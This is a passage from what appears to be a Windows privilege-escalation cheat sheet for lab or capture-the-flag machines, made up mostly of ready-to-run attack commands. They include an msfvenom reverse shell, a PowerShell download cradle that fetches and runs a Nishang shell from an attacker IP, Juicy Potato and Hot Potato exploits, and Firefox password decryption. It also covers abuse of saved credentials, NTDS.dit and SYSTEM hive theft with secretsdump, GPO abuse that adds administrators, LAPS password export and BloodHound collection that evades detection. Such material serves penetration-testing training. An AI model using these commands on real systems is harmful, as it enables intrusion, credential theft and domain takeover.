$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o common.exe
```
3. Transfer the generated file, `common.exe`, to the Windows VM.

### Windows VM

1. Place `common.exe` in `'C:\Program Files\Unquoted Path Service'`.
2. Open command prompt and type: 
```console
C:\Temp> sc start unquotedsvc
# OR
C:\Temp> net start unquotedsvc
```

### Kali VM

1. Wait for a reverse shell on your kali machine.

# <span style="color:lightblue">Juicy potato attack</span>

## <span style="color:lightgreen">Methodology</span>

This privilege allows us to impersonate a token of a privileged account such as NT AUTHORITY\SYSTEM. 

## <span style="color:lightgreen">Detection</span>


### Windows VM

1. We should have `SeImpersonatePrivilege` privileges enabled
```console
C:\Temp>whoami /priv
```
![image](https://user-images.githubusercontent.com/59029171/161144004-97322646-a231-4fef-afd8-239570f44f8c.png)

##  <span style="color:lightgreen">Exploitation</span>

### Kali VM
1. Copy `Invoke-PowerShellTcp.ps1` from [nishang](https://github.com/samratashok/nishang/tree/master/Shells) shells as `shell.ps1`
2. Add the line at the bottom of `shell.ps1`
```console
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.31 -Port 9999
```

3. Lets create a `shell.bat` file
```console
powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.31/shell.ps1')
```

4. Transfer `shell.bat` and `juicypotato.exe` on victim machine
```console
$ (new-object net.webclient).downloadfile('http://10.10.14.31/file', 'C:\temp\file')
```

5. Set a listener on port 9999
```console
$ sudo rlwrap nc -lnvp 9999
```

### Windows VM

1. Run juicy potato
```console
$ ./jp.exe -p shell.bat -l 7777 -t *
```
+ If this fail
+ Try with a different CLSID depending upon the system version and select the CLSID which supports NT AUTHORITY\SYSTEM
+ Link --> [http://ohpe.it/juicy-potato/CLSID](http://ohpe.it/juicy-potato/CLSID)

2. Lets run again
```console
$ ./jp.exe -p shell.bat -l 7777 -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
```

### Kali VM

1. Wait for a reverse shell on your kali machine.

# <span style="color:lightblue">Hot Potato attack</span>

## <span style="color:lightgreen">Methodology</span>

Hot Potato takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP->SMB relay) and NBNS spoofing.

## <span style="color:lightgreen">Detection</span>

### Windows VM

1. We should have `SeImpersonatePrivilege` privileges enabled
```console
C:\Temp> whoami /priv
```
![image](https://user-images.githubusercontent.com/59029171/161144004-97322646-a231-4fef-afd8-239570f44f8c.png)

##  <span style="color:lightgreen">Exploitation</span>

I will be demonstrating a simple exploitation technique by adding a user to the local administrators group using [Tater.ps1](https://github.com/Kevin-Robertson/Tater/blob/master/Tater.ps1)

### Windows VM

1. Enter the following to gain administrator access
```console
C:\Temp> powershell.exe -nop -ep bypass
PS C:\Temp> Import-Module C:\Temp\Tater.ps1
PS C:\Temp> Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

# <span style="color:lightblue">Kernel Exploits</span>

## <span style="color:lightgreen">Searcing exploits</span>

This method is handy for checking any existing exploits available for the machine by looking at the system information.
From the results of [windows-exploit-suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py) we can select one of the kernel exploits and try to escalate privileges.

### Windows VM

1. Run systeminfo and save it into a text file

```console
C:\Temp> systeminfo
```

### Kali VM

1. Pass the file thorugh [windows-exploit-suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)

```console
$ ./windows-exploit-suggester.py --update

[*] initiating...
[*] successfully requested base url
[*] scraped ms download url
[+] writing to file 2020-06-06-mssb.xlsx
[*] done

$ ./windows-exploit-suggester.py --database 2020-06-06-mssb.xlsx --systeminfo systeminfo.txt 

Exploits will be displayed here...
```

# <span style="color:lightblue">Password Mining Escalation - Firefox</span>

## <span style="color:lightgreen">Detection</span>
1. winpeas 
2. Path location :
```console
C:\Temp> C:\Users\usernamehere\AppData\Roaming\Mozilla\Firefox\Profiles
```

## Requirements
Copy the following files from the Windows VM to Kali VM:
1. key4.db
2. logins.json
3. addons.json
4. cert9.db

## <span style="color:lightgreen">Exploitation</span>
1. Download the following
```console
$ git clone https://github.com/lclevy/firepwd.git
```

2. Place the required files in the same directory and run the python file for the creds

```console
$ python3 firepwd.py
 
globalSalt: b'2d45b7ac4e42209a23235ecf825c018e0382291d'
<SNIP>
clearText b'86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808'
decrypting login/password pairs
   https://creds.com:b'mayor',b'<<HIDDEN>>'
```

# <span style="color:lightblue">Runas-Savdcreds</span>
## <span style="color:lightgreen">Methodology</span>
We can check if there are any pre-existing credentials of the administrator on the system. We can abuse this by using the loaded creds for privilege escalation. In the below example, I will demonstrate how to read files through the saved creds.

## <span style="color:lightgreen">Detection</span>
1. winpeas 
2. Checking for existence

```console
$ cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

## <span style="color:lightgreen">Exploitation</span>
1. Reading root flag

```console
C:\Temp> C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE c:\Users\Administrator\Desktop\root.txt > C:\Users\security\root1.txt"
```

# <span style="color:lightblue">Backup Operators (Disk shadow + Robocopy)</span>

## <span style="color:lightgreen">Methodology</span>

If the user is a part of the Backup Operator group, the user has the ability to create system backups and could be used to obtain copies of sensitive system files that can be used to retrieve passwords such as the SAM and SYSTEM Registry hives and the NTDS.dit Active Directory database file.

## <span style="color:lightgreen">Detection</span>

1. The user should be a part of the Backup Operators group and should have  SeBackupPrivilege and SeRestorePrivilege Enabled

```console
C:\Temp> net user unsername-here
C:\Temp> whoami /all
```

## <span style="color:lightgreen">Exploitation</span>

### Kali VM
1. Create this script and transfer it to Windows VM

```powershell
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

### Windows VM

1. Pass the script to **diskshadow unility** to create the shadow copy
```powershell
PS C:\Temp> diskshadow /s script.txt
```
2. Now copy the NTDS file using **_Robocopy_** to the Temp file we created in the C: drive
```powershell
PS C:\Temp> robocopy /b E:\Windows\ntds . ntds.dit
```
3. Next we get the system registry hive that contains the key needed to decrypt the NTDS file with **_reg save_** command.
```powershell
PS C:\Temp> reg save hklm\system c:\temp\system.hive
```

### Dumping NTML Hashes

1. We can use `secretsdump.py` do decrypt the DA creds on Kali VM

```console
$ secretsdump.py -ntds ntds.dit -system system.hive LOCAL | tee hash-dump
```

# <span style="color:lightblue">Abusing GPO permissions</span>

## <span style="color:lightgreen">Exploitation</span>
We Abusing GPO by adding the user to the local Administrators group leveraging a tool called SharpGPOAbuse.

Source : [https://github.com/FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

Pre compiled binaries : [https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)

+ Add user to local administrator groups

```powershell
PS C:\Enterprise-Share> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
[+] Domain = vulnnet.local
[+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local
[+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local
[+] GUID of "SECURITY-POL-VN" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] Creating file \\vulnnet.local\SysVol\vulnnet.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```

+ Force Update the system

```powershell
PS C:\Enterprise-Share> gpupdate /force
Updating policy...
Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

+ Now review our group memberships after we forced the policies to be updated on the target machine.

```powershell
PS C:\Enterprise-Share> net user enterprise-security
# Will be added to the administrators group
```

# <span style="color:lightblue">Export LAPS Passwords</span>

## <span style="color:lightgreen">Methodology</span>
The following script assumes that LAPS has already been configured into your environment & that your user account already has access to view LAPS passwords using the Fat Client UI or from Active Directory Users & Computers.

This script loads the Active Directory module, finds the LAPS password fields, and then saves them to a CSV with the date appended to the file name. The only thing you’d need to change is the file path.

## <span style="color:lightgreen">Exploitation</span>

1. Just Open Powershell and paste this script
```powershell
$Computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
$Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
$computers | Export-Csv -path c:\temp\"LAPS-$((Get-Date).ToString("MM-dd-yyyy")).csv" -NoTypeInformation
```

2. Then, save it to the location of your choice. For this example, I’m saving to
```console
C:\Scripts\LAPSexport.ps1
```

3. Then, run the script to verify it works correctly. If it does, you should automate this procedure by creating a Scheduled Task.

# BloodHound Enumeration
Enable Sharp-Hound and execute
```
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All,LoggedOn
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```
To avoid detections like ATA
```
Invoke-BloodHound -CollectionMethod All -ExcludeDC
```
Start neo4j and BloodHound UI on kali machine and load the zip/json files
```
sudo neo4j console&;bloodhound&
```

